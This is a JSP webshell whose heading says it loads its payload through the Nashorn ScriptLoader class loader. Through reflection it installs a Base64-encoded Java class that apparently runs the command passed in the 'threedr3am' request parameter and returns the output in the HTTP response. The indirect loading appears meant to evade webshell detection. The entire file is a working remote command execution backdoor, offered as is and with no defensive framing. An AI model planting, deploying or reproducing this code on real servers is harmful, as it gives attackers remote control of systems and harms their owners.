<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.security.CodeSource" %>
<%@ page import="java.security.cert.Certificate" %>
<%@ page import="java.util.Base64" %>
<%@ page import="jdk.nashorn.internal.runtime.Context" %>
<%@ page import="jdk.nashorn.internal.runtime.options.Options" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="sun.reflect.misc.MethodUtil" %>
<html>
<body>
<h2>jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP Webshell</h2>
<%
    Class c = Class.forName("jdk.nashorn.internal.runtime.ScriptLoader");
    final Constructor constructor = c.getDeclaredConstructor(Context.class);
    constructor.setAccessible(true);
    final Method m = c.getDeclaredMethod("installClass", String.class, byte[].class, CodeSource.class);
    m.setAccessible(true);
    class A {
        B b;
        final class B {
            private Object o;
            private Object[] oo;

            public B() throws IllegalAccessException, InvocationTargetException, InstantiationException {
                o = constructor.newInstance(new Context(new Options(""), null, null));
                oo = new Object[]{"Threedr3am_6", Base64.getDecoder().decode("yv66vgAAADQAiAoAGgA+BwA/CgACAD4HAEAHAEEKAEIAQwoAQgBECgBFAEYKAAUARwoABABICgAEAEkKAAIASggASwoAAgBMCQAQAE0HAE4KAE8AUAgAUQoAUgBTCgBUAFUKAFQAVgoAVwBYCgBZAFoJAFsAXAoAXQBeBwBfAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA5MVGhyZWVkcjNhbV82OwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcATgcAYAcAPwcAQAEACkV4Y2VwdGlvbnMHAGEBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAFYnl0ZXMBAAJbQgEABGNvZGUBAApTb3VyY2VGaWxlAQARVGhyZWVkcjNhbV82LmphdmEMAB0AYgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAGMMAGQAZQwAZgBnBwBoDABpAGoMAB0AawwAHQBsDABtADIMAG4AbwEAAQoMADEAMgwAGwAcAQAMVGhyZWVkcjNhbV82BwBwDABxAHIBABJUaHJlZWRyM2FtXzYuY2xhc3MHAHMMAHQAdQcAdgwAdwB4DAB5AHoHAHsMAHwAfwcAgAwAgQCCBwCDDACEAIUHAIYMAIcAHgEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA9qYXZhL2xhbmcvQ2xhc3MBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABNnZXRSZXNvdXJjZUFzU3RyZWFtAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9pby9JbnB1dFN0cmVhbTsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEABShbQilJAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgAhABAAGgAAAAEAAAAbABwAAAADAAEAHQAeAAIAHwAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAgAAAAHgAHAAAADgAEAA8ADAAQACUAEgAvABMAPgAVAEYAFgAhAAAANAAFAAAARwAiACMAAAAAAEcAJAAcAAEADAA7ACUAJgACACUAIgAnACgAAwAsABsAKQAcAAQAKgAAABsAAv8AJQAEBwArBwAsBwAtBwAuAAD8ABgHACwALwAAAAQAAQAwAAEAMQAyAAEAHwAAAC8AAQABAAAABSq0AA+wAAAAAgAgAAAABgABAAAAGgAhAAAADAABAAAABQAiACMAAAAJADMANAACAB8AAACEAAIABAAAACgSELYAERIStgATTCu2ABS8CE0rLLYAFVe4ABYstgAXTrIAGC22ABmxAAAAAgAgAAAAGgAGAAAAHgALAB8AEgAgABgAIQAgACIAJwAjACEAAAAqAAQAAAAoADUANgAAAAsAHQA3ADgAAQASABYAOQA6AAIAIAAIADsAHAADAC8AAAAEAAEAMAACADwAAAACAD0AfgAAAAoAAQBZAFcAfQAJ"), new CodeSource(null, (Certificate[]) null)};
            }
        }

        public A() throws IllegalAccessException, InstantiationException, InvocationTargetException {
            b = new B();
        }

        public Class invokex(Method method)
                throws InvocationTargetException, IllegalAccessException {
            return (Class) MethodUtil.invoke(method, b.o, b.oo);
        }
    }

    Class target = new A().invokex(m);
    response.getOutputStream().write(target.getConstructor(String.class).newInstance(request.getParameter("threedr3am")).toString().getBytes());
%>
</body>
</html>